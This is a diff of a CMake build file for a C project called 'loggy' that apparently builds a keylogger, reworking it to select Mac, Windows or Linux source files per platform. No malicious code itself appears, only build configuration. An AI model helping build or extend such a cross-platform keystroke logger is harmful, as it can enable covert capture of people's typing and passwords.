@@ -2,13 +2,8 @@ cmake_minimum_required(VERSION 3.16)
 project(loggy C)
 
 set(CMAKE_C_STANDARD 11)
-add_executable(loggy main.c include/keylogger.h src/keylogger.c include/types.h)
 
-if (${CMAKE_SYSTEM_NAME} MATCHES "Darwin")
-    set(MACOSX TRUE)
-endif()
-
-if (MACOSX)
+if (APPLE)
     find_library(CARBON Carbon)
     if (NOT CARBON)
         message(FATAL_ERROR "Carbon not found")
@@ -19,5 +14,18 @@ if (MACOSX)
         message(FATAL_ERROR "ApplicationServices not found")
     endif()
 
-    target_link_libraries(loggy ${CARBON} ${APPLICATION_SERVICES})
+    set(PLATFORM_SOURCE_FILES src/mac.c)
+    set(PLATFORM_LINK_LIBRARIES ${CARBON} ${APPLICATION_SERVICES})
 endif()
+
+if (WIN32)
+    set(PLATFORM_SOURCE_FILES src/windows.c)
+endif()
+
+if (UNIX AND NOT APPLE)
+    set(PLATFORM_SOURCE_FILES src/linux.c)
+endif (UNIX AND NOT APPLE)
+
+
+add_executable(loggy main.c include/keylogger.h include/types.h ${PLATFORM_SOURCE_FILES})
+target_link_libraries(loggy ${PLATFORM_LINK_LIBRARIES})
